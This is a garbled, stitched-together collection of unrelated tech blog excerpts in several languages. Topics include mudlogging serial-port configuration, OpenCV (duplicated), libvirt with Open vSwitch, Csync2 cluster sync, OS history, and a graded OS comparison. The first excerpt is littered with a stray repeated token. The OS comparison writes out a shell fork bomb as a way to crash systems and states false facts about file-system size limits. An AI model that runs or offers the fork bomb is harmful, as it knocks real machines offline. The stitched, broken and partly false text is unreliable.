But now we need to leave this port Merlin to communicate directly with the GC so they opt to use the / dev/ser1 to perform interface parameters QLOG drilling with Merlin. (For more information on serial communication here). The serial port as defined in the Merlin / dev/ser1 rneasy is an RS485 port which has higher immunity to noise and distance            so it is preferred in industrial applications. So in the "octopus" is linked up to 7 or 8 ports, in our case and to standardize the SER1 will be connected to port 7 of "octopus".     Once this is done, all you type in a terminal should appear in another, which must be accurate tipee otherwise there may be an error in the configuration of port speed conmunmente.     Note: Speed may be 38400 or 9600, but the important rneasy thing is that it is the same in both systems. Do the same for the Merlin ser2 which will connect the $ cti8 the "octopus"     You can leave the changes in the configuration rneasy of the ports so that they are permanent by editing: init.cti.8 found in the config directory 3 QLOG :/     Remember that you must create a well in the Merlin rneasy to transmit data from the chromatograph to QLOG, this well should be the template of Mudlogging, and another well to monitor which in our case would be the template of PETROBRAS ..     Now you need to edit the file regsitro of Merlin to configure interface by SER1, remember that commonly toward transmission by SER4 but now this port is the direct connection to the GC.     mk Device     Note: If there are problems in the WW lelgada data on the PC (Windows), and has already proven communication between all ports QLOG and Merlin, take a look at the file "program" that is located in the directory config of the well and make sure they are activated commands and WWpb WWinterface     Updates to your e-mail       2012 (36)   Maio (1)   Marco (8)   Janeiro (27) Recording Density Separation Gondwana Santos Basin formation pressure Cement Wear Bushing Macaé Itanhaem Windows rneasy            Shutting Down Youtube Videos Natura 2.0 Configuring rneasy SAP Entry Gas Chromatography Gas chromatograph VARIAN CP4900 Base Level Truck Driving Record Automatic Gamma ray curves of Meto Meto Love The File Recovery Reservoir.

Each virtual machine can contain an arbitrary set of virtual   devices and separate the operating system. Scope of virtual machine download is   very wide - from performing the functions of  avirtualization software testing to create   entire networks, which are easily scaled, load-balance and protect.   VirtualBox is free, open source  virtual machine software,.              There are versions virtual machine software, intended to   be installed on virtually all operating systems, including Windows,   Linux, Macintosh and OpenSolaris. As a "guest" operating system can also   be used any operating system including Windows (NT 4.0, 2000, XP,   vm server 2003, Vista, W7), DOS / Windows 3.x, Linux, and OpenBSD.

  <title><![CDATA[Sejarah Perkembangan Sistem Operasi]]></title>
  <summary><![CDATA[Sistem operasi merupakan sebuah  penghubung antara pengguna dari komputer dengan perangkat keras  komputer. Sebelum ada sistem operasi, orang hanya mengunakan komputer  dengan menggunakan sinyal analog dan sinyal digital (silahkan cari  sendiri apa itu sinyal analog dan sinyal digital). Seiring dengan  berkembangnya pengetahuan dan teknologi, pada saat ini terdapat berbagai  sistem operasi dengan keunggulan masing-masing. Untuk lebih memahami  sistem operasi maka sebaiknya perlu diketahui terlebih dahulu beberapa  konsep dasar mengenai sistem operasi itu sendiri. Pengertian sistem operasi secara umum  adalah pengelola seluruh sumber-daya yang terdapat pada sistem komputer  dan menyediakan sekumpulan layanan (system calls) ke pemakai sehingga  memudahkan danmenyamankan penggunaan serta pemanfaatan sumber-daya  sistem komputer ( artikel bahan kuliah).Menurut Wikipedia sistem Operasi adalah  software pada lapisan pertama yang ditempatkan pada memeori komputer  pada saat komputer dinyalakan. Sedangkan software-software lainnya  dijalankan setelah Sistem Operasi berjalan, dan Sistem Operasi akan  melakukan layanan inti umum untuk software-software itu.Menurut Tanenbaum, sistem operasi mengalami perkembangan yang sangat pesat, yang dapat dibagi kedalam empat generasi: 1. Generasi Pertama (1945-1955)Generasi pertama merupakan awal  perkembangan sistem komputasi elektronik sebagai pengganti sistem  komputasi mekanik, hal itu disebabkan kecepatan manusia untuk menghitung  terbatas dan manusia sangat mudah untuk membuat kecerobohan, kekeliruan  bahkan kesalahan. Pada generasi ini belum ada sistem operasi, maka  sistem komputer diberi instruksi yang harus dikerjakan secara langsung.2. Generasi Kedua (1955-1965)Generasi kedua memperkenalkan Batch  Processing System, yaitu Job yang dikerjakan dalam satu rangkaian, lalu  dieksekusi secara berurutan.Pada generasi ini sistem komputer belum  dilengkapi sistem operasi, tetapi beberapa fungsi sistem operasi telah  ada, contohnya fungsi sistem operasi ialah FMS (Fortran Monitoring  System) dan IBSYS. Jadi generasi komputer kedua ini merupakan generasi  pertama dari sistem Operasi.3. Generasi Ketiga (1965-1980)Pada generasi ini perkembangan sistem  operasi dikembangkan untuk melayani banyak pemakai sekaligus, dimana  para pemakai interaktif berkomunikasi lewat terminal secara on-line ke  komputer, maka sistem operasi menjadi multi-user (di gunakan banyak  pengguna sekaligus) dan multi-programming (melayani banyak program  sekaligus).4. Generasi Keempat (Pasca 1980an)Dewasa ini, sistem operasi dipergunakan  untuk jaringan komputer dimana pemakai menyadari keberadaan  komputer-komputer yang saling terhubung satu sama lainnya. Pada masa ini  para pengguna juga telah dinyamankan dengan Graphical User Interface  yaitu antar-muka komputer yang berbasis grafis yang sangat nyaman, pada  masa ini juga dimulai era komputasi tersebar dimana komputasi-komputasi  tidak lagi berpusat di satu titik, tetapi dipecah dibanyak komputer  sehingga tercapai kinerja yang lebih baik.  Adapun sejarah sistem operasi yang  dirinci dari tahun 1980an. Artikel ini menguraikan sejarah sistem  operasi dari DOS, Mac, Windows, BSD, sampai Linux.1956GM-NAAI/O :Sistem operasi pertama ini digunakan pertama kali oleh  General Motors pada komputer besar IBM 704. Namun, sistem ini tidak  lebih hebat dari Batch Processing.1969Unix :Sistem operasi modern pertama ini  dikembangkan oleh Ken Thompson dan Dennis Ritchie yang saat itu  membutuhkan sebuah platform yang cepat untuk game “Space Travel” mereka.1973 XeroxAlto : Sistem pertama      dengan graphical interface yang hanya digunakan untuk penelitian sampai      19811980QDOS : Tim Paterson dari Seattle Computer menulis QDOS yang dibuat  dari OS terkenal pada masa itu, CP/M.

  <title><![CDATA[Wrapping libvirt Virtual Networks Around Open vSwitch Fake Bridges]]></title>
  <summary><![CDATA[In a previous article, I talked about how to use Open vSwitch (OVS) fake bridges to bring VLAN support into your environment. In this article, I show you how to wrap a libvirt virtual network around your OVS fake bridge. 
You might ask, “Why wrap a libvirt virtual network around an OVS fake bridge when you can just use the OVS bridge directly?” That’s a good question, and—to be perfectly honest—I don’t have a great answer. At first glance, it seems like it might make things easier if you are mixing both OVS-based networks and other types of networks, but I don’t know that for certain. If anyone has any feedback one way or the other (why this is a good idea or why it’s not a good idea), please speak up in the comments. 
Now that we have that out of the way, the process for using a libvirt virtual network with an OVS fake bridge is actually pretty straightforward. First, create the appropriate OVS fake bridges using the instructions in this article. So, for example, you might create a fake bridge for VLAN 100 like this: 

ovs-vsctl add-br vlan100 ovsbr0 100

Next, create an XML definition for a libvirt virtual network. For a fake bridge named vlan100, your XML definition might look something like this: 


  vlan100-net
  
  


Then, in the guest domain configuration, you reference the libvirt virtual network instead of the underlying bridge directly, like this: 


  
  
  ...


And that’s it! Based on my testing, it even appears that you can make this change on the fly, without having to reboot the guest domain. However, I could be wrong—if anyone knows definitively, please speak up in the comments. Any other corrections, clarifications, or questions are also welcome in the comments below.

  <summary><![CDATA[OpenCV (Open Source Computer Vision Library) is a library of programming functions mainly aimed at real-time computer vision, developed by Intel, and now supported by Willow Garage and Itseez. It is free for use under the open source BSD license. The library is cross-platform. It focuses mainly on real-time image processing. If the library finds Intel’s Integrated Performance Primitives on the system, it will use these proprietary optimized routines to accelerate itself.

History
Officially launched in 1999, the OpenCV project was initially an Intel Research initiative to advance CPU-intensive applications, part of a series of projects including real-time ray tracing and 3D display walls. The main contributors to the project included a number of optimization experts in Intel Russia, as well as Intel’s Performance Library Team. In the early days of OpenCV, the goals of the project were described as 


Advance vision research by providing not only open but also optimized code for basic vision infrastructure. No more reinventing the wheel.


Disseminate vision knowledge by providing a common infrastructure that developers could build on, so that code would be more readily readable and transferable.


Advance vision-based commercial applications by making portable, performance-optimized code available for free—with a license that did not require to be open or free themselves.


The first alpha version of OpenCV was released to the public at the IEEE Conference on Computer Vision and Pattern Recognition in 2000, and five betas were released between 2001 and 2005. The first 1.0 version was released in 2006. In mid-2008, OpenCV obtained corporate support from Willow Garage, and is now again under active development. A version 1.1 “pre-release” was released in October 2008. 
The second major release of the OpenCV was on October 2009. OpenCV 2 includes major changes to the C++ interface, aiming at easier, more type-safe patterns, new functions, and better implementations for existing ones in terms of performance (especially on multi-core systems). Official releases now occur every 6 months[1] and development is now done by an independent Russian team supported by commercial corporations. 
Applications

 


openFrameworks running the OpenCV add-on example.


OpenCV’s application areas include: 

2D and 3D feature toolkits
Egomotion estimation
Facial recognition system
Gesture recognition
Human–computer interaction (HCI)
Mobile robotics
Motion understanding
Object identification
Segmentation and Recognition
Stereopsis Stereo vision: depth perception from 2 cameras
Structure from motion (SFM)
Motion tracking

To support some of the above areas, OpenCV includes a statistical machine learning library that contains: 

Boosting (meta-algorithm)
Decision tree learning
Gradient boosting trees
Expectation-maximization algorithm
k-nearest neighbor algorithm
Naive Bayes classifier
Artificial neural networks
Random forest
Support vector machine (SVM)

Programming language
The library was originally written in C[2] and this C interface makes OpenCV portable to some specific platforms such as digital signal processors. Wrappers for languages such as C#, Ch [3], Python,[4] Ruby and Java (using JavaCV[5]) have been developed to encourage adoption by a wider audience. 
However, since version 2.0, OpenCV includes both its traditional C interface as well as a new C++ interface.[6] This new interface seeks to reduce the number of lines of code necessary to code up vision functionality as well as reduce common programming errors such as memory leaks (through automatic data allocation and deallocation) that can arise when using OpenCV in C.[7] Most of the new developments and algorithms in OpenCV are now developed in the C++ interface. Unfortunately, it is much more difficult to provide wrappers in other languages to C++ code as opposed to C code; therefore the other language wrappers are generally lacking some of the newer OpenCV 2.0 features. A CUDA-based GPU interface has been in progress since September 2010.[8] 
OS support
OpenCV runs on Windows, Android,[9] Maemo,[10] FreeBSD, OpenBSD, iOS,[11] Linux and Mac OS. The user can get official releases from SourceForge, or take the current snapshot under SVN from there. OpenCV uses CMake. 
Windows prerequisites
The BaseClasses from DirectShow SDK is required to build some camera input-related parts of OpenCV on Windows. This SDK is found in the Samples\Multimedia\DirectShow\BaseClasses subdirectory of the Microsoft Platform SDK (or DirectX SDK 8.0 to 9.0c / DirectX Media SDK prior to 6.0), which must be built prior to the building of OpenCV.

OpenCV (Open Source Computer Vision Library). Originalmente, desenvolvida pela Intel, em 2000, é uma biblioteca multiplataforma, totalmente livre ao uso acadêmico e comercial, para o desenvolvimento de aplicativos na área de Visão Computacional, bastando seguir o modelo de licença da BSD Intel. O OpenCV possui módulos de Processamento de Imagens e Video I/O, Estrutura de dados, Álgebra Linear, GUI (Interface Gráfica do Usuário) Básica com sistema de janelas independentes, Controle de mouse e teclado, além de mais de 350 algorítmos de Visão Computacional como: Filtros de imagem, calibração de câmera, reconhecimento de objetos, análise estrutural e outros. O seu processamento é em tempo real de imagens. 
Esta biblioteca foi desenvolvida nas linguagens de programação C/C++. Também, dá suporte a programadores que utilizem Java, Python e Visual Basic e desejam incorporar a biblioteca a seus aplicativos. A versão 1.0 foi lançada no final de 2006 e a 2.0 foi lançada em setembro de 2009.

OpenCV

English 
OpenCV (Open Source Computer Vision Library) is a library of programming functions mainly aimed at real-time computer vision, developed by Intel, and now supported by Willow Garage and Itseez. It is free for use under the open source BSD license. The library is cross-platform. It focuses mainly on real-time image processing. If the library finds Intel’s Integrated Performance Primitives on the system, it will use these proprietary optimized routines to accelerate itself.

History
Officially launched in 1999, the OpenCV project was initially an Intel Research initiative to advance CPU-intensive applications, part of a series of projects including real-time ray tracing and 3D display walls. The main contributors to the project included a number of optimization experts in Intel Russia, as well as Intel’s Performance Library Team. In the early days of OpenCV, the goals of the project were described as 


Advance vision research by providing not only open but also optimized code for basic vision infrastructure. No more reinventing the wheel.


Disseminate vision knowledge by providing a common infrastructure that developers could build on, so that code would be more readily readable and transferable.


Advance vision-based commercial applications by making portable, performance-optimized code available for free—with a license that did not require to be open or free themselves.


The first alpha version of OpenCV was released to the public at the IEEE Conference on Computer Vision and Pattern Recognition in 2000, and five betas were released between 2001 and 2005. The first 1.0 version was released in 2006. In mid-2008, OpenCV obtained corporate support from Willow Garage, and is now again under active development. A version 1.1 “pre-release” was released in October 2008. 
The second major release of the OpenCV was on October 2009. OpenCV 2 includes major changes to the C++ interface, aiming at easier, more type-safe patterns, new functions, and better implementations for existing ones in terms of performance (especially on multi-core systems). Official releases now occur every 6 months[1] and development is now done by an independent Russian team supported by commercial corporations. 
Applications

 


openFrameworks running the OpenCV add-on example. 



OpenCV’s application areas include: 

2D and 3D feature toolkits
Egomotion estimation
Facial recognition system
Gesture recognition
Human–computer interaction (HCI)
Mobile robotics
Motion understanding
Object identification
Segmentation and Recognition
Stereopsis Stereo vision: depth perception from 2 cameras
Structure from motion (SFM)
Motion tracking

To support some of the above areas, OpenCV includes a statistical machine learning library that contains: 

Boosting (meta-algorithm)
Decision tree learning
Gradient boosting trees
Expectation-maximization algorithm
k-nearest neighbor algorithm
Naive Bayes classifier
Artificial neural networks
Random forest
Support vector machine (SVM)

Programming language
The library was originally written in C[2] and this C interface makes OpenCV portable to some specific platforms such as digital signal processors. Wrappers for languages such as C#, Ch [3], Python,[4] Ruby and Java (using JavaCV[5]) have been developed to encourage adoption by a wider audience. 
However, since version 2.0, OpenCV includes both its traditional C interface as well as a new C++ interface.[6] This new interface seeks to reduce the number of lines of code necessary to code up vision functionality as well as reduce common programming errors such as memory leaks (through automatic data allocation and deallocation) that can arise when using OpenCV in C.[7] Most of the new developments and algorithms in OpenCV are now developed in the C++ interface. Unfortunately, it is much more difficult to provide wrappers in other languages to C++ code as opposed to C code; therefore the other language wrappers are generally lacking some of the newer OpenCV 2.0 features. A CUDA-based GPU interface has been in progress since September 2010.[8] 
OS support
OpenCV runs on Windows, Android,[9] Maemo,[10] FreeBSD, OpenBSD, iOS,[11] Linux and Mac OS. The user can get official releases from SourceForge, or take the current snapshot under SVN from there. OpenCV uses CMake. 
Windows prerequisites
The BaseClasses from DirectShow SDK is required to build some camera input-related parts of OpenCV on Windows. This SDK is found in the Samples\Multimedia\DirectShow\BaseClasses subdirectory of the Microsoft Platform SDK (or DirectX SDK 8.0 to 9.0c / DirectX Media SDK prior to 6.0), which must be built prior to the building of OpenCV.

  <summary><![CDATA[Python asan öyrənilə bilən imkanları geniş yüksək səviyyəli programlaşdırma dilidir. Xüsusilə obyekt-yönlü proglaşdırma dillərinə aid olması ilə programçıları özünə cəlb edir. Elegant sintaksisi və tərcümə olunan (interpreted) olması onu əsas ideal edən cəhətlərdən biridir. Bu məqalədə Python ilə başlamaq üçün tələb olunan əsaslar yazılmışdır.     Bəs Python sizə nə kimi kömək edə bilər. Deyək ki, böyük həcmli mətn fayllarınız var və siz axtarış-yerdəyişmə prosesini avtomatlaşdırmaq istəyirsiniz. Bu zaman Python sadə sintaksisi sayəsində çox asanlıqla bunu yerinə yetirə bilərsiniz.     Bəlkə də ola bilər, siz C++ dili ilə professional olaraq çalışırısınız. Amma yazmaq/komilyasiya/test/yenidən kompilyasiya prosesi sizi bezdirib.     Python verdiyi imkan sayəsində siz programlarınızı yenidən istifadə etmək üçün modullara bölə bilərsiniz. Həmçinin Pythonun standart kitabxanası vasitəsilə siz programlarınızı daha da zənginləşdirə bilərsiniz.     Pythonun tarixinə bit qədər göz salaq: İlk dəfə 1989-cu ildə  Guido van Rossum tərəfindən tətbiq edilməyə başladı. ABC dilinin davamçısı olaraq təqdim olundu. Python 2.0 2000-ci ildə təqdim olundu. Bu versiyada bir çox yeniliklər və özəlliklər təqdim olundu, həmçinin Unicode-u dəstəkləyən ilk Python oldu. Python 3.0 isə 2008-ci ildə təqdim olundu. Əvvəl buraxılmış Pythonun bir çox özəlliklərini dəstəkləyir. Bu versiyadan sonra isə 3.0 vesiyasının bir çox özəllikləri Python 2.6 və 2.7-yə əlavə olundu.     Pythonun tətbiq sahəsinə gəldikdə isə əsasən veb programlaşdırma dili olaraq istifadə olunur. Django , Pylons, Turbo Gears kimi Python-da yazılmış veb freymvorklər isitfadəçilərə çox geniş imkanlar verir. Bəzi tanınmış məhsullarında skirptləmə dili olaraq istifadə olunur. Bunlarda Cinema 4D, Maya, Blender progrmlarını göstərmək olar. Bir çox əməliyyat sistemlərində Python üstündə gəlir, Linux distribusiyalarında, FreeBSD, OpenBSD, NetBSD və OS X-da terminaldan istifadə etməklə Pythonla program yazmaq olar.    Python-la başlamaq üçün Python sizə Python interpreter lazım olacaq. Bu linkdən əldə edə bilərsiniz.    Endirəcəyiniz paketdə isə Pythonun dokumentasiyası və Python İDLE gələcək ki, burda siz programlarınız yazdığınız anda nəticəni əldə edə bilərsiniz.]]></summary>

  <title><![CDATA[Synkronisering af filer i et cluster med Csync2]]></title>
  <summary><![CDATA[Jeg har tidligere brugt GlusterFS til den slags, men Gluster er en af de tunge drenge … særligt når vi har med web-content o.l. at gøre, desuden vil jeg gerne udnytte det at jeg har flere diske at sende data fra fuldt ud, derfor har jeg eksperimenteret lidt med Csync2 som er et bidirektionelt filsynkroniserings værktøj. 
Det er brugbart til f.eks. at holde et webdir i sync på tværs over et cluster, men det er ikke statefull nok til at holde nogen former for dynamiske data, det tager typisk et til fem minutter fra en fil rammer disken på en node før den når de andre. 
Jeg vil designe et system med to noder og bagefter vil jeg så tilføje en tredie node for yderligere redundans. 
Først installerer jeg csync2 på begge maskiner: root@node1:~# apt-get -y install openbsd-inetd csync2
root@node2:~# apt-get -y install openbsd-inetd csync2Rediger filen /etc/csync2.cfg, på node1, den er typisk helt tom og skal skrives fra bunden. Min ser således ud: group cluster
{
         host node1;
         host node2;

         key /etc/csync2_ssl_cert.key;
         include /var/www;

         auto none;
}File skal være ens på begge noder, ligesom du skal huske at oprette /var/www root@node1:~# mkdir /var/www
root@node2:~# mkdir /var/wwwI /etc/hosts på begge maskiner sætter du dine servere op således: 192.168.10.11 node1.cluster.com  node1
192.168.10.12 node2.cluster.com  node2Dette skyldes at csync2 skal kunne nå de andre server blot ved deres short-name “node1″. Nu skal der oprette SSL Certifikater, det er næsten automatiseret, følgende skal gøres påkun den ene node, angiv ikke “common” name og ligeledes skal der ikke angive password, blot tryk enter. Dernæst skal filerne distribueres til de andre maskiner: root@node1:~# csync2 -k /etc/csync2.key
root@node1:~# openssl genrsa -out /etc/csync2_ssl_key.pem 1024
root@node1:~# openssl req -new -key /etc/csync2_ssl_key.pem -out /etc/csync2_ssl_cert.csr
root@node1:~# openssl x509 -req -days 600 -in /etc/csync2_ssl_cert.csr -signkey /etc/csync2_ssl_key.pem -out /etc/csync2_ssl_cert.pemKopier nøglerne og onfig over på den anden node: root@nod12:~# scp /etc/csync2* root@node2:/etcHvis der ligger nogle filer i e af mapperne bør du kopierer dem inden du går videre: scp -r /var/www/* root@node2:/var/wwwDernæst skal Csync2 køres løbende, det koster ikke vildt mange resourcer at køre og derfor er der, såfremt dit directory ikke er for stort, intet problem i at køre hvert 5. minut. Jeg har prøvet en gang med en million filer, det tog 3 minutter at løbe igennem. Jeg vil dog her til mine tests have den endnu navere og sætter den derfor til at købe hvert minut: root@node1:~# crontab -e
*/5 * * * *     /usr/sbin/csync2 -x
root@node2:~# crontab -e
*/5 * * * *     /usr/sbin/csync2 -xGenstart nu inetd på begge maskiner: root@node1:~# /etc/init.d/openbsd-inetd restart
root@node2:~# /etc/init.d/openbsd-inetd restartOg så er det tid til at teste: root@node1:/var/www# watch ls -lOg så opretter vi nogle filer på den anden node: root@node2:/var/www# touch test_a.txt
root@node2:/var/www# touch test_b.txtOg vente så et par min og se dine nye filer komme til syne i det andet vindue]]></summary>

  <summary><![CDATA[Here's a comprehensive breakdown of some of the pros and cons of different Operating systems:  The Operating systems in question are as follows:  Linux  (Call it a kernel if you will, but I'm generalizing it across all distros) FreeBSD Mac OS X Windows   1. Reliability  Windows:  I don't think there should be any trouble reaching a conclusion here.  The majority of windows users are familiar with the "Blue Screen of  Death". Poor reliability is a major drawback in windows. How many  windows users turn their computers on and hold their breath in  anticipation of a crash, or sigh when the computer jams after clicking a  button. Some major (read 'publicized') issues were resolved in XP and  more recently Windows 7 which uses the vista kernel anyway. But 'code  bloat' has introduced more reliability problems. Many windows fans argue  that it will be fixed with the next update, and each new update fixes  some issues introducing new ones. Windows uses a lot of system resources  and it is very difficult to keep the system up for more than a couple  of months without it reverting to a crawl as memory gets corrupted and  filesystems fragmented. Even frequent maintenance just prolongs the  inevitable by a few hours at the most. Grade: E  Linux:  Linux is well known for it's reliability. Servers will often stay up for  years. However, in most distros, disk I/O is non-synchronous by  default, which is less reliable for transaction based operations. This  can produce a corrupted filesystem after a system crash or power  failure, but the new ext4 filesystem changes a lot of things and makes  things more stable. This is usually only a problem for people setting up  servers, and if they're smart enough they'd change the disk I/O to  synchronous anyway. Linux is very dependable for the average desktop  user. Grade: B  FreeBSD:  FreeBSD is extremely robust and has recorded uptime in years. "Soft  Updates" optimize the I/O for maximum performance yet still ensures  reliability for transaction-based operations such as database calls.  I've tried throwing a lot of gunk into the cogs and it is incredibly  difficult to crash. Windows and some improperly configured linux distros  yeilded to a simple fork bomb e.g : () {:|:}; : Grade: A  Mac OSX:  To be honest, Leopard did screw some things up in regard to stability  but they were pretty much fixed in Snow Leopard. Although it'll take a  little more time to sand out some minor kinks, it is extremely reliable  for desktop users. On another note, The darwin kernel, which lies at the  core of OSX was derived from the FreeBSD architecture and uses the same  userland. Grade: B-   2. Performance      Windows:  Windows is adequate for average desktop use but fails miserably under  heavy network loads. A few organizations (I don't think it'd be legally  advisable to take names here) try to make it work as a server and suffer  from frequent error messages. For their own "hotmail" servers microsoft  used BSD for many years. As far as desktop performance is concerned, as  long as you don't multi task like crazy, you should be fine. Grade: C  Linux:   Linux performs well for most applications, however the performance is  not so optimal under heavy network load. The network performance of  Linux is 20-30% below the capability of FreeBSD running on the same  hardware. The situation has improved especially since the 2.4 release of  the Linux kernel introduced a new virtual memory system and the open  source nature allows technology sharing which rapidly enhances  performance tweaks. Linux is very capable of handling loads and can be  adapted to almost any requirement or need. Grade: A  FreeBSD:  FreeBSD is the system of choice for high performance network  applications. It will outperform other systems when running on  equivalent hardware. The largest and busiest public server on the  Internet at ftp.freesoftware.com, uses FreeBSD to serve more than 1.2  terabyte/day of downloads. FreeBSD is used by Yahoo!, Qwest, and many  others as their main server OS because of its ability to handle heavy  network traffic with high performance and rock stable reliability. This  can actually be thought of as derived from a need for faster and more  efficient processing due to the compilation process of using the ports  collection. Grade: A Mac OSX:  OSX is designed specifically to run on a specific set of hardware  (apple) and this allows developers to optimize the system for maximum  efficiency. However, the closed source nature of the development puts it  at a slight disadvantage in regard to the time it takes to fine tune a  system. But, all in all, it handles performance very well. Grade: B-   3. Security  Windows:  Seriously, it doesn't matter how secure Microsoft claims their system  is, the reality is that they hold the world record for the most security  holes ever (CERT advisories agree). They offer no guarantee of security  and their software is not available for inspection or peer review due  to the closed-source nature of the OS. There is no way, therefore, for  users to fix or diagnose any of the issues regularly published about  windows systems. Don't try to play a bullshit argument that hackers  target windows only because of it's widespread use because that argument  loses premises when I stated CERT advisories above. To give an example,  compare telnet which uses a plaintext passcode to protect you, to ssh,  which unix-based operating systems use by default, that use heavy rsa  encryption to protect you. Microsoft Windows has been affected by a very  large number of known security holes that have cost companies millions  of dollars. Grade: F  Linux:  Until a couple of years ago, there was no formal code review policy, and  because of that many linux distributions still use non-secure defaults,  and has been susceptible to Unix-based CERT attacks, but the  open-source nature allows for this to be fixed very rapidly. And linux  does include a very robust packet filtering firewall system and a  competent administrator can remove unsafe services. An example of rapid  response fixing is when Konqueror and IE were both discovered to have a   loophoe in their SSL protocols which allowed for it to be remotely  exploited; the KDE dev team went through incoming solution proposals and  had a fix out within the hour. Microsoft took a month to announce that  they were working on a fix. 'Nuff said. Grade: B-  FreeBSD:  FreeBSD has been the subject of a massive auditing project for several  years. All of the critical system components have been checked and  rechecked for security-related errors. The entire system is open source  so the security of the system can and has been verified by third  parties. A default FreeBSD installation has yet to be affected by a  single CERT advisory. It also has a notion of kernel security levels,  virtual server jails (which are a pretty unique innovation),  capabilities, ACLs, a very robust packet filtering firewall system, and  intrusion detection tools. BSD is more mature than linux and when it  comes to security it has all the necessary tools to keep you safe. On a  side note: OpenBSD is supposed to be the BSD channel that is optimized  for security, FreeBSD is meant for performance Grade: A  Mac OSX:  Mac OSX inherits it's rock solid security from it's unix lineage and  therefore has very few vulnerabilities. The vulnerabilities that are  most common actually take advantage of backdoors in microsoft office for  mac applications. Microsoft is yet to release a fix for this (With the  heavy competition, it's not hard to fathom why). But OSX makes it's  procedures very user-friendly, unfortunately, it does not make it  idiot-proof and a person could very easily open up his hard disk for  remote access (even though a password is required y default, if the  person is dumb enough not to know what he's doing then he/she probably  doesn't have a strong password either) Grade: B   4. File-system   Windows:   The windows FAT and NTFS file-systems are plagued with 20 years of  backward compatibility with some of the earliest PC-based file-systems.  These file-systems are not designed for today's server applications in  mind. Heck, they weren't even designed with a multi-user OS or  networking in mind. The maximum file size is roughly 4GB if I'm not  mistaken, whereas it's 16GB in ext3 and 1TB in ext4 both of which are  unix filesystems. Higher single file sizes reduce and eliminate  fragmentation within a filesystem. So, basically, the Windows  file-system is walking on two broken legs, but it's walking nonetheless. Grade: D  Linux:  The new journaled ext3 and ext4 filesystems fix the problems with ext2  which is now mostly only used as swap, and the ext2 gets it's  performance via an asynchronous mount (which is good for swap, not so  much for file storage). They offer extremely good performance and the trend of improvement shows  great promise for the future. It is currently a rock-solid file-system. Grade: B+  FreeBSD:  FreeBSD uses the Berkeley Fast Filesystem, which is a little more  complex than Linux's ext3. It offers a better way to ensure file-system  data integrity, mainly with the "softupdates" option. This option  decreases synchronous I/O and increases asynchronous I/O because writes  to an FFS file-system aren't synced on a sector basis but according to  the file-system structure. This ensures that the file-system is always  coherent between two updates. The FreeBSD file-system also supports file  flags, which can stop a would-be intruder dead in his tracks. There are  several flags that you can add to a file such as the immutable flag.  The immutable (schg) flag won't allow any alteration to the file or  directory unless you remove it. Other very handy flags are append only  (sappnd), cannot delete (sunlnk), and archive (arch). When you combine  these with the kernel security level option, you have a nearly  impenetrable system. The FreeBSD file-system has also been reworked for  8.0 and adds many new features. Grade: A  Mac OSX:  The HFS+ file-system on the mac is a huge improvement over HFS which  suffered problems namely with font labels and block size allocation  mapping algorithms. This file-system is one of apple's greatest triumphs  and is the same on used in the ipod, if you were wondering. Although  complete data integrity is still a little questionable, it rarely poses  any problems and the HFS wrapper can easily be changed to encrypt data  without having to change into a crypto_luks file-system or similiar. Grade:  A   5. Device drivers  Windows:  Microsoft has excellent relations with device vendors, and by excellent I  mean lucrative. This allows them to attract a large number of drivers,  and even though there are often conflicts on different versions of  windows, and you have to hassle with cd's or finding drivers yourself  most of the time; Windows users have excellent access to third-party  drivers. Grade: A  Linux:  The linux community makes it difficult for vendors to release binary  only drivers, usually in an effort to make them release open-source  drivers. Now, most device vendors don't wan't other people peeping into  their source code, so the binaries that they release are an example of  what happens when closed-source clashes with open source... lot's of  frustrating glitches that the community can't fix due to absence of  source code. Many simply create their own, but this takes a lot of time  and effort. Giving away drivers to an open-source community isn't really  as lucrative for the vendors so they are reluctant to release them.  This situation is changing, however, since now more and more people have  started using linux, including some of the hardware vendors themselves.   But honestly, if you're determined enough, you usually find a way for  it to work, and most linux users are tech-savvy enough for it. (Support  groups are free if you need a geek) Grade: C-   FreeBSD:  The FreeBSD bootloader can load binary drivers at boot-time. This allows  third-party driver manufacturers to distribute binary-only driver  modules that can be loaded into any system. Due to the open-source  nature of FreeBSD, it is very easy to develop device drivers for new  hardware. Unfortunately, most device manufacturers will only release  binaries for Microsoft operating systems (keyword: lucrativeness). This  means that it can take several months after a hardware device hits the  market until a native device driver is available. Fortunately, FreeBSD also includes full NDIS API compatibility, so that  binary Windows network device drivers can be loaded into the FreeBSD  kernel directly. Basically, it converts the windows driver into a kernel  module, kinda like ndiswrapper in linux, except it's easier to  understand and do in FreeBSD. Grade: B  Mac OSX:  Due to the hardware exclusivity of apple, drivers are not an issue at  all. They make the hardware, and they make the software, so they make  them work good with each other. Third-party drivers are also available  for OSX users, but they rarely ever need them. The only situation in  which I needed a driver when using OSX was with a printer, but it  automatically fetched the driver for me so that kind of eliminates the  'hunting' part. Grade: A   6. Commercial applications  Windows:  There are hundreds of thousands of commercial applications applications  for windows, and usually only for windows. Nearly all commercial desktop  applications (yes that includes games) are made only for windows. If  you have an important application that runs only on windows, then you  have to run that applications either in windows or a windows emulator  such as wine or cedega. Grade: A  Linux:  Many new commercial applications are available for Linux, and more are  being developed. Unfortunately, Linux can only run binaries that are  specifically compiled for the distribution in question. It is unable to  run programs compiled for FreeBSD, SCO Unix, or other popular operating  systems without significant effort. On the other hand, emulators such as  wine (free) and crossover (not free) allow windows binaries to be  executed so  this opens up a whole new commercial application library  for Linux. Grade: C  FreeBSD:  The number of commercial applications for FreeBSD is growing rapidly,  but is still below what is available for windows. In addition to native  applications, FreeBSD can also run programs compiled for Linux, SCO  Unix, and BSD/OS. Wine, cedega and cross-over are also available for  FreeBSD. Grade: C+  Mac OSX:  Most popular commercial applications are available for OSX and recently,  there has been a lot of growth in the number of commercial applications  available. Some applications such as Aperture 2  are exclusive to OSX  and tend to be of a very good quality. Cross-Over is also available for  OSX Grade: C  NOTE: I have not mentioned the fact that all Operating systems  can run virtual machines which can then run a seperate operating system  within the one you are currently running. Notable examples are  VirtualBox and Parallels.  7. Free applications  Windows:  The amount of free Windows software is much less than what is available  for Unix. Many Windows applications are provided as "shareware", without  source code, so the programs cannot be customized, debugged, improved,  or extended by the user. Piracy is illegal and thus I am not considering  pirated copies of applications or warez as "free". Licensed free-ware  for windows is not common in this context. Grade: D  Linux:  There are huge numbers of free programs available for Linux. All GNU  software runs on both Linux and FreeBSD without modification. Some of  the free programs for Linux differ between distributions, because Linux  does not have a central ports collection. If you're using a commercial  application, chances are there is an open source version of it that does  exactly the same thing, maybe without some of the eye-candy though.  It's kind of like a modified rule 34: If there is a commercial app for  it, there is open-source for it. If not then it must be created. Grade: A  FreeBSD:  There are many, many gigabytes of free software applications available  